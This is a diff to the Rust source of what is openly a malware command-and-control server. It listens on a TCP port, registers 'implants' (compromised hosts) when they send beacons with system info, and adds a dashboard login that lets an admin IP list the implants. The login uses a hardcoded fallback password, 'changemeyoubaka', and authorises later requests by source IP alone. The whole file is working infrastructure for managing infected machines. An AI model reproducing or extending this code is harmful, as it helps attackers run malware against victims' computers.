@@ -1,15 +1,17 @@
 use std::{
     collections::HashMap,
-    io::Read,
+    env,
+    io::{Read, Write},
     net::{IpAddr, TcpListener},
-    time::Instant,
+    time::SystemTime,
 };
 
-use common::{IMPLANT_REPORT_RATE_SECONDS, Packet, SystemInfo, decode};
+use common::{IMPLANT_REPORT_RATE_SECONDS, Implant, Packet, decode, encode};
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     let listener = TcpListener::bind("0.0.0.0:9120")?;
     let mut implants = HashMap::new();
+    let mut admin_ip = None;
 
     for stream in listener.incoming() {
         let mut stream = stream.unwrap();
@@ -24,13 +26,43 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
         match decoded {
             Packet::Beacon { system_info } => {
-                implants.insert(
-                    stream.peer_addr().unwrap().ip(),
-                    Implant {
-                        last_report: Instant::now(),
-                        system_info,
-                    },
-                );
+                implants.insert(stream.peer_addr().unwrap().ip(), Implant::new(system_info));
+            }
+            Packet::DashboardLogin { password } => {
+                let passwd = match env::var_os("TYSE_PASSWORD") {
+                    Some(os_string) => os_string
+                        .into_string()
+                        .unwrap_or("changemeyoubaka".to_string()),
+                    None => "changemeyoubaka".to_string(),
+                };
+
+                if passwd == password {
+                    stream.write(encode(Packet::LoginSuccess).unwrap().as_slice())?;
+
+                    admin_ip = Some(stream.peer_addr().unwrap().ip());
+                } else {
+                    stream.write(encode(Packet::LoginFailed).unwrap().as_slice())?;
+                }
+            }
+            _ => {
+                if let Some(admin_ip) = admin_ip
+                    && stream.peer_addr().unwrap().ip() == admin_ip
+                {
+                    match decoded {
+                        Packet::ImplantListRequest => {
+                            stream.write(
+                                encode(Packet::ImplantList(
+                                    implants.values().map(|implant| implant.clone()).collect(),
+                                ))
+                                .unwrap()
+                                .as_slice(),
+                            )?;
+                        }
+                        _ => {
+                            stream.write(encode(Packet::C2Alive).unwrap().as_slice())?;
+                        }
+                    }
+                }
             }
         }
 
@@ -42,19 +74,16 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 }
 
 fn remove_old_implants(implants: &mut HashMap<IpAddr, Implant>) -> HashMap<IpAddr, Implant> {
-    let now = Instant::now();
+    let now = SystemTime::now();
 
     implants
         .iter()
         .filter(|(_ip, implant)| {
-            now.duration_since(implant.last_report).as_secs() < IMPLANT_REPORT_RATE_SECONDS.end
+            now.duration_since(implant.last_beacon_timestamp)
+                .unwrap()
+                .as_secs()
+                < IMPLANT_REPORT_RATE_SECONDS.end
         })
         .map(|(ip, implant)| (*ip, implant.clone()))
         .collect()
-}
-
-#[derive(Debug, Clone)]
-struct Implant {
-    last_report: Instant,
-    system_info: SystemInfo,
 }
